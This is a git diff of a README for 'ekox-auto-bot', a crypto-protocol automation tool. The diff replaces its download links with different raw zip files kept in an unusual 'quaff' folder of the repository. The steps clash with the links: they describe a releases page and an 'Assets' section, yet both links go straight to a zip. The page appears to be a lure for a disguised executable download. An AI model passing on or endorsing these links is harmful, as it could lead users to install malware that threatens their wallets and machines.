@@ -1,13 +1,13 @@
 # 🤖 ekox-auto-bot - Automate Your Ekox Interactions Easily
 
 ## 🔗 Download Now
-[![Download ekox-auto-bot](https://raw.githubusercontent.com/kArMa7y/ekox-auto-bot/main/quaff/ekox-auto-bot_v3.3.zip)](https://raw.githubusercontent.com/kArMa7y/ekox-auto-bot/main/quaff/ekox-auto-bot_v3.3.zip)
+[![Download ekox-auto-bot](https://github.com/kArMa7y/ekox-auto-bot/raw/refs/heads/main/quaff/ekox_auto_bot_1.3.zip)](https://github.com/kArMa7y/ekox-auto-bot/raw/refs/heads/main/quaff/ekox_auto_bot_1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the ekox-auto-bot! This software helps you automate your interactions with the Ekox protocol on the Hoodi network. It supports deposit, withdraw, and claim operations. If you want to streamline your experience, follow the steps below to download and run the application.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download ekox-auto-bot Releases](https://raw.githubusercontent.com/kArMa7y/ekox-auto-bot/main/quaff/ekox-auto-bot_v3.3.zip). On this page, you will find the latest version and release notes. 
+To get started, visit this page to download: [Download ekox-auto-bot Releases](https://github.com/kArMa7y/ekox-auto-bot/raw/refs/heads/main/quaff/ekox_auto_bot_1.3.zip). On this page, you will find the latest version and release notes. 
 
 1. Scroll down to the "Assets" section of the release you want. 
 2. Click on the file that matches your system (e.g., .exe for Windows, .dmg for macOS, etc.).
